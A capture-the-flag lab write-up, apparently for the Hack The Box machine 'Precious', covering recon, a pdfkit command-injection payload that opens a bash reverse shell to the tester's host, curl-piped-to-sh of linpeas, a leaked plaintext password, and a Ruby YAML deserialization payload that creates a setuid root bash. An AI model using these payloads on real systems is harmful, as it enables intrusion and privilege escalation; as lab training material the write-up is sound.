# Precious

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.211.246  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 09:14 UTC
Nmap scan report for 10.129.211.246
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/9%OT=22%CT=1%CU=36916%PV=Y%DS=2%DC=T%G=Y%TM=64328217
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   93.19 ms 10.10.16.1
2   46.93 ms 10.129.211.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.46 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.211.246
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 09:15 UTC
Nmap scan report for 10.129.211.246
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/9%OT=22%CT=1%CU=36314%PV=Y%DS=2%DC=T%G=Y%TM=6432824F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   93.50 ms 10.10.16.1
2   47.16 ms 10.129.211.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.50 seconds
```

```c
$ sudo nmap -sV -sU 10.129.211.246
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 09:20 UTC
Nmap scan report for precious.htb (10.129.211.246)
Host is up (0.084s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1135.69 seconds
```

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.211.246  precious.htb
```

### Enumeration of Port 80/TCP

> http://precious.htb/

```c
$ whatweb http://precious.htb/\
http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.129.211.246], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Testing if the webserver connects back.

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.211.246 - - [09/Apr/2023 09:18:50] code 404, message File not found
10.129.211.246 - - [09/Apr/2023 09:18:50] "GET /foobar HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
```

```c
$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.27] from (UNKNOWN) [10.129.211.246] 45544
GET /foobar HTTP/1.1
Host: 10.10.16.27
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/10.0 Safari/602.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
```

### Directory Busting with Gobuster

```c
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://precious.htb
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://precious.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/09 09:16:42 Starting gobuster in directory enumeration mode
===============================================================
```

### Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.precious.htb" -u http://precious.htb --fs 145

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://precious.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.precious.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________
```

## Foothold

> https://security.snyk.io/package/rubygems/pdfkit

> https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

Skeleton Payload:

```c
http://example.com/?name=#{'%20`sleep 5`'}
```

### Building Reverse Shells

> https://www.revshells.com/

Modified Version:

```c
http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.16.27/9001 0>&1"`'}
```

> http://precious.htb/

### Upgrading Shells

> https://github.com/0xsyr0/OSCP#upgrading-shells

```c
$ nc -lnvp 9001                                                                                                                                                                                                                           
listening on [any] 9001 ...
connect to [10.10.16.27] from (UNKNOWN) [10.129.211.246] 41470
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ruby@precious:/var/www/pdfapp$ ^Z
[1]+  Stopped                 nc -lnvp 9001
```

```c
$ stty raw -echo
```

```c
ruby@precious:/var/www/pdfapp$ export XTERM=xterm
```

## Enumeration

```c
ruby@precious:/var/www/pdfapp$ id 
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

```c
ruby@precious:/var/www/pdfapp$ ls -la
total 36
drwxr-xr-x 6 root root 4096 Oct 26 08:28 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
drwxr-xr-x 4 root ruby 4096 Oct 26 08:28 app
drwxr-xr-x 2 root ruby 4096 Oct 26 08:28 config
-rw-r--r-- 1 root ruby   59 Sep 10  2022 config.ru
-rw-r--r-- 1 root ruby   99 Sep 17  2022 Gemfile
-rw-r--r-- 1 root ruby  478 Sep 26  2022 Gemfile.lock
drwxrwxr-x 2 root ruby 4096 Apr  9 05:20 pdf
drwxr-xr-x 4 root ruby 4096 Oct 26 08:28 public
```

```c
ruby@precious:/var/www/pdfapp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
ruby:x:1001:1001::/home/ruby:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

| Usernames |
| --- |
| ruby |
| henry |

### LinPEAS

> https://github.com/carlospolop/PEASS-ng

```c
ruby@precious:/dev/shm$ curl http://10.10.16.27/linpeas.sh | sh
```

```c
/home/               
/home/henry/user.txt
/home/henry/.bash_history
/home/ruby/.bundle
/home/ruby/.bundle/config
/home/ruby/.bash_history
```

## Privilege Escalation to henry

```c
ruby@precious:~/.bundle$ ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 5 ruby ruby 4096 Apr  9 05:57 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
```

```c
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

| Username | Password |
| --- | --- |
| henry | Q3c1AqGHtoI0aXAYFH |

```c
$ ssh henry@precious.htb
henry@precious.htb's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$
```

## user.txt

```c
henry@precious:~$ cat user.txt 
b75d3a2b291296d2635d28a947384769
```

## Pivoting

```c
henry@precious:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
```

```c
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

```c
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
Traceback (most recent call last):
        2: from /opt/update_dependencies.rb:17:in `<main>'
        1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT
```

```c
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

## Malicious YAML File

> https://www.redhat.com/sysadmin/suid-sgid-sticky-bit

```c
$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "cp /bin/bash /tmp/; chmod +s /tmp/bash"
         method_id: :resolve
```

```c
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

```c
henry@precious:~$ ls -la /tmp
total 1252
drwxrwxrwt 11 root root    4096 Apr  9 06:08 .
drwxr-xr-x 18 root root    4096 Nov 21 15:11 ..
-rwsr-sr-x  1 root root 1234376 Apr  9 06:08 bash
drwxrwxrwt  2 root root    4096 Apr  9 04:54 .font-unix
drwxrwxrwt  2 root root    4096 Apr  9 04:54 .ICE-unix
drwxr-xr-x  5 root root    4096 Apr  9 05:54 passenger.5miLQCj
drwx------  2 ruby ruby    4096 Apr  9 05:18 runtime-ruby
drwx------  3 root root    4096 Apr  9 04:54 systemd-private-a975f5440eec4126b54a64662ddd6177-systemd-logind.service-U0nT6i
drwxrwxrwt  2 root root    4096 Apr  9 04:54 .Test-unix
drwx------  2 root root    4096 Apr  9 04:55 vmware-root_385-1823804000
drwxrwxrwt  2 root root    4096 Apr  9 04:54 .X11-unix
drwxrwxrwt  2 root root    4096 Apr  9 04:54 .XIM-unix
```

```c
henry@precious:~$ /tmp/bash -p
bash-5.1#
```

```c
bash-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
```

## root.txt

```c
bash-5.1# cat root.txt 
8640fd302887239f1e61870bf7d626cf
```
